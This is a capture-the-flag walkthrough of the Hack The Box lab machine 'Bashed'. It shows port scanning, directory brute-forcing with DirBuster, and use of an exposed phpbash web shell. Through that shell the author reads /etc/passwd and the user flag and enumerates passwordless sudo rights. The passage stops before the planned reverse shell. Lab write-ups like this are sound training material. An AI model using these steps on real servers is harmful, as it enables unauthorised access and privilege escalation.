# HTB - Bashed
## OS - Linux

I started with an nmap scan of Bashed (IP address: 10.10.10.68)
```
──╼ $nmap -sC -sV 10.10.10.68
Starting Nmap 7.80 ( https://nmap.org ) at 2020-12-20 16:42 PST
Nmap scan report for 10.10.10.68
Host is up (0.092s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Arrexel's Development Site

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.83 seconds
```
Visiting http://10.10.10.68 shows phpbash tool at http://10.10.10.68/single.html. 

That made me try Dirbuster. Here are some results after a few min.

```
Dir found: / - 200
Dir found: /images/ - 200
Dir found: /icons/ - 403
File found: /index.html - 200
File found: /single.html - 200
Dir found: /js/ - 200
File found: /js/imagesloaded.pkgd.js - 200
File found: /js/jquery.js - 200
File found: /js/jquery.nicescroll.min.js - 200
File found: /js/jquery.smartmenus.min.js - 200
File found: /js/jquery.carouFredSel-6.0.0-packed.js - 200
File found: /js/jquery.mousewheel.min.js - 200
Dir found: /demo-images/ - 200
File found: /js/jquery.touchSwipe.min.js - 200
File found: /js/custom_google_map_style.js - 200
File found: /js/jquery.easing.1.3.js - 200
File found: /js/html5.js - 200
File found: /js/main.js - 200
Dir found: /uploads/ - 200
Dir found: /php/ - 200
File found: /php/sendMail.php - 200

```
Since phpbash.php was missing in the results, I tried again. This time with /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt. I got more results. 

```
Starting OWASP DirBuster 1.0-RC1
Starting dir/file list based brute forcing
Dir found: / - 200
Dir found: /images/ - 200
File found: /index.html - 200
Dir found: /icons/ - 403
File found: /single.html - 200
Dir found: /js/ - 200
File found: /js/jquery.js - 200
File found: /js/imagesloaded.pkgd.js - 200
File found: /js/jquery.nicescroll.min.js - 200
File found: /js/jquery.smartmenus.min.js - 200
Dir found: /demo-images/ - 200
File found: /js/jquery.carouFredSel-6.0.0-packed.js - 200
File found: /js/jquery.mousewheel.min.js - 200
File found: /js/custom_google_map_style.js - 200
File found: /js/jquery.touchSwipe.min.js - 200
File found: /js/html5.js - 200
File found: /js/jquery.easing.1.3.js - 200
File found: /js/main.js - 200
Dir found: /uploads/ - 200
Dir found: /php/ - 200
File found: /php/sendMail.php - 200
Dir found: /css/ - 200
File found: /css/carouFredSel.css - 200
File found: /css/clear.css - 200
File found: /css/common.css - 200
File found: /css/font-awesome.min.css - 200
File found: /css/sm-clean.css - 200
Dir found: /icons/small/ - 403
Dir found: /dev/ - 200
File found: /dev/phpbash.min.php - 200
File found: /dev/phpbash.php - 200

```

This worked: http://10.10.10.68/dev/phpbash.php

Browsing through this tool, I saw that user arrexel has an account, so I got the flag from /home/arrexel/user.txt.

```
_apt:x:105:65534::/nonexistent:/bin/false
messagebus:x:106:110::/var/run/dbus:/bin/false
uuidd:x:107:111::/run/uuidd:/bin/false
arrexel:x:1000:1000:arrexel,,,:/home/arrexel:/bin/bash
scriptmanager:x:1001:1001:,,,:/home/scriptmanager:/bin/bash
www-data@bashed
:/var/www/html/dev# id

uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@bashed
:/var/www/html/dev# ls /home/arrexel

user.txt
www-data@bashed
:/var/www/html/dev# cat /home/arrexel/user.txt
```

I also see that www-data has sudo permissions to become scriptmanager without any password.

```
www-data@bashed
:/var/www/html/dev# sudo -l

Matching Defaults entries for www-data on bashed:
env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on bashed:
(scriptmanager : scriptmanager) NOPASSWD: ALL
```

To get the root flag, I need a reverse shell, as the connection through this phpbash.php is not persistent.
